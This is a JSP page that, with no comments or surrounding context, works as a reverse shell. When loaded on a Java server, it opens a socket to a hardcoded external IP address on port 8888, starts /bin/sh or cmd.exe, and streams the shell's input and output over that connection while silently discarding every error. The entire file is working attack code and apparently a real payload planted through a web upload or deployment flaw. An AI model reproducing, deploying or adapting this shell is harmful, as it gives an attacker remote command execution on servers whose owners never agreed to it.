<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wD;
    OutputStream sS;

    StreamConnector( InputStream wD, OutputStream sS )
    {
      this.wD = wD;
      this.sS = sS;
    }

    public void run()
    {
      BufferedReader m6  = null;
      BufferedWriter wr2 = null;
      try
      {
        m6  = new BufferedReader( new InputStreamReader( this.wD ) );
        wr2 = new BufferedWriter( new OutputStreamWriter( this.sS ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = m6.read( buffer, 0, buffer.length ) ) > 0 )
        {
          wr2.write( buffer, 0, length );
          wr2.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( m6 != null )
          m6.close();
        if( wr2 != null )
          wr2.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "62.171.160.234", 8888 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
